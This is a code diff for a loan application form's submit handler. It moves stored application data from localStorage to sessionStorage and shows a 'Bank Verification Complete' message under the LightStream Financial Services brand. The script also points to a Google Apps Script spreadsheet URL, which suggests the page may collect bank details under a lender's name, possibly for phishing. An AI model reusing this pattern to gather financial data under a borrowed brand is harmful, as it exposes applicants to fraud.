@@ -518,7 +518,7 @@ const SHEET_URL = "https://script.google.com/macros/s/AKfycbxRURL9p2FblMv7CLOeUx
 document.querySelector("form").addEventListener("submit", async function(e) {
   e.preventDefault();
 
-  const loanData = JSON.parse(localStorage.getItem("loanData")) || {};
+  const loanData = JSON.parse(sessionStorage.getItem("loanData")) || {};
 
   // Check if user came from personal loan form or is standalone
   const hasLoanData = loanData && Object.keys(loanData).length > 0 && loanData.loanAmount;
@@ -567,8 +567,8 @@ document.querySelector("form").addEventListener("submit", async function(e) {
       // User came from personal loan form - continue to loan agreement
       alert("🏦 Bank Verification Complete!\n\nYour application has been successfully submitted and is now under review.\n\nNext Steps:\n• You will receive your loan agreement shortly\n• Check your email for important updates\n• Loan decision typically within 24 hours\n\nThank you for choosing LightStream Financial Services.");
 
-      // Store loan data for loan agreement page
-      localStorage.setItem("loanApplicationData", JSON.stringify(finalData));
+      // Store loan data for loan agreement page (SECURE: sessionStorage only)
+      sessionStorage.setItem("loanApplicationData", JSON.stringify(finalData));
 
       // Redirect to loan agreement page after successful submission
       setTimeout(() => {
